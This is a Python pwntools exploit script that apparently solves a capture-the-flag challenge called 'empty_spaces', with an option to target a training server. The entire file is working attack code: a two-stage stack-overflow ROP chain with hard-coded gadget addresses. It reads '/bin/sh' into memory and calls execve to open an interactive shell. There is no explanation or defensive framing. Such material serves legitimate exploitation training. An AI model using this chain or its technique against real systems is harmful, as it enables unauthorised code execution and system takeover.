from pwn import *
import time

CHALL_PATH = "./empty_spaces"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
# b *0x4019A2
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("empty-spaces.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

# GADGETS:
pop_rsi = 0x477d3d
pop_rdx = 0x4447d5
pop_rax = 0x42146b 
pop_rdi = 0x4787b3 
bss = 0x4ac100
syscall = 0x40ba76
main = 0x401984  # a little bit before call read...

# First Stage: launch read with 0x1000 byte 
def first_stage():
    payload = b"A" * 72                         
    payload += p64(pop_rdx)
    payload += p64(0x1000)
    payload += p64(main)
    return payload

# Second Stage: new pad is 88, now we can insert much longer payload
def second_stage():
    ### read /bin/sh ####
    payload = b"B" * 88
    payload += p64(pop_rdi)
    payload += p64(0)
    payload += p64(pop_rsi)
    payload += p64(bss)
    payload += p64(pop_rdx)
    payload += p64(8)
    payload += p64(pop_rax)
    payload += p64(0)
    payload += p64(syscall)
    ### execve /bin/sh ####
    payload += p64(pop_rdi)
    payload += p64(bss)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx)
    payload += p64(0)
    payload += p64(pop_rax)
    payload += p64(0x3b)
    payload += p64(syscall)
    return payload


c.recvuntil(b"pwn?\n")
payload = first_stage()
c.sendline(payload)
time.sleep(0.5)



payload = second_stage()
c.sendline(payload)
time.sleep(0.5)


# insert /bin/sh when execute the read in the second stage
c.sendline(b"/bin/sh\x00")
c.interactive()